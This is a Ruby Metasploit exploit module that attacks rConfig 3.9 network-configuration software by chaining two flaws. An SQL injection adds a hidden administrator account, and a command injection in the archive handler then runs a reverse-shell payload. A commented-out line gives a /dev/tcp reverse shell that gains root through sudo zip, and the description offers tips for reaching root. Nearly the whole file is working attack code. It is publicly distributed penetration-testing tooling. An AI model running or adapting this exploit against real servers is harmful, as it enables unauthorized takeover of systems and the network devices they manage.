# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      &#039;Name&#039; => &#039;Rconfig 3.x Chained Remote Code Execution&#039;,
                      &#039;Description&#039; => &#039;
        This module exploits multiple vulnerabilities in rConfig version 3.9
        in order to execute arbitrary commands.
        This module takes advantage of a command injection vulnerability in the
        `path` parameter of the ajax archive file functionality within the rConfig web
        interface in order to execute the payload.
        Valid credentials for a user with administrative privileges are required.
        However, this module can bypass authentication via SQLI.
        This module has been successfully tested on Rconfig 3.9.3 and 3.9.4.
        The steps are:
          1. SQLi on /commands.inc.php allows us to add an administrative user.
          2. An authenticated session is established with the newly added user
          3. Command Injection on /lib/ajaxHandlers/ajaxArchiveFiles.php allows us to
             execute the payload.
          4. Remove the added admin user.
        Tips : once you get a shell, look at the CVE-2019-19585.
        You will probably get root because rConfig install script add Apache user to
        sudoers with nopasswd ;-)
      &#039;,
                      &#039;License&#039;         => MSF_LICENSE,
                      &#039;Author&#039;          =>
        [
          &#039;Jean-Pascal Thomas&#039;, # @vikingfr - Discovery, exploit and Metasploit module
          &#039;Orange Cyberdefense&#039; # Module tests - greetz : CSR-SO team (https://cyberdefense.orange.com/)
        ],
                      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2019-19509&#039;], # authenticated rce
          [&#039;CVE&#039;, &#039;2020-10220&#039;], # sqli auth bypass
          %w[EDB 47982],
          %w[EDB 48208],
          [&#039;URL&#039;, &#039;https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2019-19509.py&#039;], # authenticated RCE
          [&#039;URL&#039;, &#039;https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py&#039;]  # unauthenticated SQLi
        ],
                      &#039;Platform&#039;        => %w[unix linux],
                      &#039;Arch&#039;            => ARCH_CMD,
                      &#039;Targets&#039;         => [[&#039;Auto&#039;, {}]],
                      &#039;Privileged&#039;      => false,
                      &#039;DisclosureDate&#039;  => &#039;2020-03-11&#039;,
                      &#039;DefaultOptions&#039;  => {
                        &#039;RPORT&#039; => 443,
                        &#039;SSL&#039;     => true, # HTTPS is required for the module to work because the rConfig php code handle http to https redirects
                        &#039;PAYLOAD&#039; => &#039;generic/shell_reverse_tcp&#039;
                      },
                      &#039;DefaultTarget&#039; => 0))
    register_options [
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path to Rconfig&#039;, &#039;/&#039;])
    ]
  end

  # CHECK IF RCONFIG IS REACHABLE AND INSTALLED
  def check
    vprint_status &#039;STEP 0: Get rConfig version...&#039;
    res = send_request_cgi!(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => &#039;/login.php&#039;
    )
    if !res || !res.get_html_document
      fail_with(Failure::Unknown, &#039;Could not check rConfig version&#039;)
    end
    if res.get_html_document.at(&#039;div[@id="footer-copyright"]&#039;).text.include? &#039;rConfig Version 3.9&#039;
      print_good(&#039;rConfig version 3.9 detected&#039;)
      return Exploit::CheckCode::Appears
    elsif res.get_html_document.at(&#039;div[@id="footer-copyright"]&#039;).text.include? &#039;rConfig&#039;
      print_status(&#039;rConfig detected, but not version 3.9&#039;)
      return Exploit::CheckCode::Detected
    end
  end

  # CREATE AN ADMIN USER IN RCONFIG
  def create_rconfig_user(user, _password)
    vprint_status &#039;STEP 1 : Adding a temporary admin user...&#039;
    fake_id = Rex::Text.rand_text_numeric(3)
    fake_pass = Rex::Text.rand_text_alpha(10)
    fake_pass_md5 = &#039;21232f297a57a5a743894a0e4a801fc3&#039; # hash of &#039;admin&#039;
    fake_userid_md5 = &#039;6c97424dc92f14ae78f8cc13cd08308d&#039;
    userleveladmin = 9 # Administrator
    user_sqli = "command ; INSERT INTO `users` (`id`,`username`,`password`,`userid`,`userlevel`,`email`,`timestamp`,`status`) VALUES (#{fake_id},&#039;#{user}&#039;,&#039;#{fake_pass_md5}&#039;,&#039;#{fake_userid_md5}&#039;,#{userleveladmin}, &#039;#{user}@domain.com&#039;, 1346920339, 1);--"
    sqli_res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/commands.inc.php&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;vars_get&#039; => {
        &#039;search&#039; => &#039;search&#039;,
        &#039;searchOption&#039; => &#039;contains&#039;,
        &#039;searchField&#039;  => &#039;vuln&#039;,
        &#039;searchColumn&#039; => user_sqli
      }
    )
    unless sqli_res
      print_warning(&#039;Failed to create user: Connection failed.&#039;)
      return
    end
    print_good "New temporary user #{user} created"
  end

  # AUTHENTICATE ON RCONFIG
  def login(user, pass)
    vprint_status "STEP 2: Authenticating as #{user} ..."
    # get session cookie (PHPSESSID)
    res = send_request_cgi!(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => &#039;/login.php&#039;
    )
    @cookie = res.get_cookies
    if @cookie.empty?
      fail_with Failure::UnexpectedReply, &#039;Failed to retrieve cookies&#039;
      return
    end
    # authenticate
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/lib/crud/userprocess.php&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_post&#039; => {
        pass: pass,
        user: user,
        sublogin: 1
      }
    )
    unless res
      print_warning(&#039;Failed to authenticate: Connection failed.&#039;)
      return
    end
    print_good "Authenticated as user #{user}"
  end

  def trigger_rce(cmd, _opts = {})
    vprint_status "STEP 3: Executing the command (#{cmd})"
    trigger = "`#{cmd} #`"
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/lib/ajaxHandlers/ajaxArchiveFiles.php&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_get&#039; => {
        &#039;path&#039; => trigger,
        &#039;ext&#039; => &#039;random&#039;
      }
    )
    # the page hangs because of the command being executed, so we can&#039;t expect HTTP response
    # unless res
    #  fail_with Failure::Unreachable, &#039;Remote Code Execution failed: Connection failed&#039;
    #  return
    # end
    # unless res.body.include? &#039;"success":true&#039;
    #  fail_with Failure::Unknown, &#039;It seems that the code was not executed&#039;
    #  return
    # end
    print_good &#039;Command sucessfully executed&#039;
  end

  # DELETE A USER
  def delete_rconfig_user(user)
    vprint_status &#039;STEP 4 : Removing the temporary admin user...&#039;
    del_sqli = "command ; DELETE FROM `users` WHERE `username`=&#039;#{user}&#039;;--"
    del_res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/commands.inc.php&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;vars_get&#039; => {
        &#039;search&#039; => &#039;search&#039;,
        &#039;searchOption&#039; => &#039;contains&#039;,
        &#039;searchField&#039;  => &#039;vuln&#039;,
        &#039;searchColumn&#039; => del_sqli
      }
    )
    unless del_res
      print_warning "Removing user #{user} failed: Connection failed. Please remove it manually."
      return
    end
    print_status "User #{user} removed successfully !"
  end

  def cleanup
    super
    delete_rconfig_user @username if @username
  end

  def exploit
    check
    @username = rand_text_alphanumeric(8..12)
    @password = &#039;admin&#039;
    create_res = create_rconfig_user @username, @password
    login(@username, @password)
    tmp_txt_file = Rex::Text.rand_text_alpha(10)
    tmp_zip_file = Rex::Text.rand_text_alpha(10)
    # The following payload (cf. 2019-19585) can be used to get root rev shell, but some payloads failed to execute (ex : because of quotes stuffs). Too bad :-(
    # trigger_rce("touch /tmp/#{tmp_txt_file}.txt;sudo zip -q /tmp/#{tmp_zip_file}.zip /tmp/#{tmp_txt_file}.txt -T -TT &#039;/bin/sh -i>& /dev/tcp/#{datastore[&#039;LHOST&#039;]}/#{datastore[&#039;LPORT&#039;]} 0>&1 #&#039;")
    trigger_rce(payload.encoded.to_s)
  end
end

